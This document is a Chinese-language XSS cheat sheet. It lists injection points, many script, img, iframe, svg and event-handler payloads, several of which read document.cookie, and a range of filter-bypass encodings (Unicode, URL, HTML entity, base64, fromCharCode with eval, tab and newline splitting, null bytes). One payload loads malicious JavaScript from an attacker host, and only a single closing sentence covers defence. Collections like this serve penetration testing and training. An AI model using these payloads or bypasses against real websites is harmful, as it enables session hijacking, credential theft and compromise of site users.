# XSS

## 测试例子

```
<script>alert(document.cookie)</script>
<script>prompt(document.cookie)</script>
<script>confirm(/xss/)</script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>       //Unicode码  还有十六进制 URL编码 JS编码 HTML实体编码等等
<script>alert/*dsa*/(1)</script>   //绕过黑名单
<script>(alert)(1)</script>        //绕过黑名单
<svg/onload=alert(1)>
<body onload=alert("XSS")>

<svg onload="alert(1)">       //过滤 script时
"><svg/onload=alert(1)//

<input value="1" autofocus onfocus=alert(1)  x="">   //过滤 script时

<a href="" onclick="alert(1111)">

<iframe src="javascript:alert(1)"></iframe>      //过滤 script时

<svg onmousemove="alert(1)">

<input name="name" value=”” onmousemove=prompt(document.cookie) >

<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

<input type = "button"  value ="clickme" onclick="alert('click me')" />

<BODY onload="alert('XSS')">

<IMG SRC="" onerror="alert('XSS')">
<IMG SRC="" onerror="javascript:alert('XSS');">

制表符 绕过滤器的
<IMG SRC="" onerror="jav&#x9ascript:alert('XSS');">
1.<iframe src=javas	cript:alert(1)></iframe> //Tab
2.<iframe src=javas
cript:alert(1)></iframe> //回车
3.<iframe src=javas
cript:alert(1)></iframe> //换行
4.<iframe src=javascript:alert(1)></iframe> //编码冒号
5.<iframe src=javasc
ript:alert(1)></iframe> //HTML5 新增的实体命名编码，IE6、7下不支持
<a href=javascript:\u0061\u006C\u0065\u0072\u0074(1)>Click</a>
<a href=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%43%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)>Click</a>
<a href=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%43%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)>Click</a>

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWHNzVGVzdCIpOzwvc2NyaXB0Pg=="></object>

"><img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59))">

<script>onerror=alert;throw document.cookie</script>
<script>{onerror=alert}throw 1337</script>         //过滤 单引号，双引号，小括号时   没过滤script

<a href="" onclick="alert(1111)">
' οnclick=alert(1111) '
```

## 常见注入点

输入框
留言板
URL中可传参数的变量

## 常用Payload

### Script标签：

```
<script>alert(/1/)</script>
<script>prompt(1)</script> 
<script>confirm(1)</script>
<script src="http://attacker.org/malicious.js"></script>
<script src=data:text/javascript,alert(1)></script>
<script>setTimeout(alert(1),0)</script>
```

### Img标签：

```
<img src=x onerror=alert(1)>
<img src=x onerror=prompt(1);>
<img src=javascript:alert('1')>
```

### a标签：

```
<a href="javascript:alert(1)">点击触发</a>
<a href="http://www.hacker.com">点击触发</a>
```

### Iframe标签：

```
<iframe src="javascript:alert(1)">
<iframe onload=alert(1)>
```

### 其他标签：

```
<video src=x onerror=prompt(1);>
<audio src=x onerror=prompt(1);>
```

### 常用事件

```
onclick: 点击触发 （<img src=x onclick=alert(1)>）
onerror: 当src加载不出来时触发 （<img src=x onerror=alert(1)>）
onload: 当src加载完毕触发（<img src=x onload=alert(1)>）
onmouseover：鼠标指针移动到图片后触发（<img src=x onmouseover=alert(1)>）
onmousemove: 鼠标指针移到指定的元素后触发（<img src=x onmousemove=alert(1) >）
onfocus: 当input输入框获取焦点时触发（<input onfocus=javascript:alert(1) autofocus>）
```

### 常用属性

```
src
action
href
data
content
```

### javascript弹窗函数

```
alert()
confirm()
prompt()
```

## 常用绕过方法

```
1.大小写绕过（<SCRIPT>）
2.双写绕过（<SCr<scRiPT>ipt>）
3.关键字HTML编码绕过
4.任意位置插入null字符（<im[%00]g onerror=alert(xss) src=a>）
5.JavaScript转义（<script>eval(‘a\154ert(1)’)</script>）
```

## Xss漏洞的防范

不信任任何用户的输入，对每个用户的输入都做严格检查，过滤，在输出的时候，对某些特殊字符进行转义，替换等
